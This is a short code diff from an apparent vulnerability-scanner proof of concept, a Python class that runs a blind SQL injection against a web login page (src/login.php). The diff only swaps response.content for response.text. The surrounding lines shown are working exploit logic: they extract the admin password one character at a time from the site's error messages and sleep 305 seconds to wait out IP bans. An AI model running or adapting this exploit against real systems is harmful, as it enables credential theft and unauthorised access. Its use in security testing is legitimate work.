@@ -60,16 +60,16 @@ class Poc(ABPoc):
                         pointer+1, lists[index])
                     response = requests.get(
                         url+"src/login.php?action_c=login&amp;user_type=1&amp;user=admin&amp;pass=&amp;nodeid=1 "+sql, timeout=10, verify=False)
-                    if "拒绝登录" in response.content:  # IP被封锁时，延迟305秒
+                    if "拒绝登录" in response.text:  # IP被封锁时，延迟305秒
                         self.output.info(
                             "login failure exceeded 5 times,ip is banned,wait for 305 seconds to continue")
                         time.sleep(305)
-                    elif "用户名或者密码不正确" in response.content:
+                    elif "用户名或者密码不正确" in response.text:
                         self.output.report(
                             self.vuln, "password[%d]=%s" % (pointer, lists[index]))
                         password += lists[index]
                         break
-                    elif "连接数据库失败" in response.content:
+                    elif "连接数据库失败" in response.text:
                         index += 1
                     else:
                         # 找不到漏洞
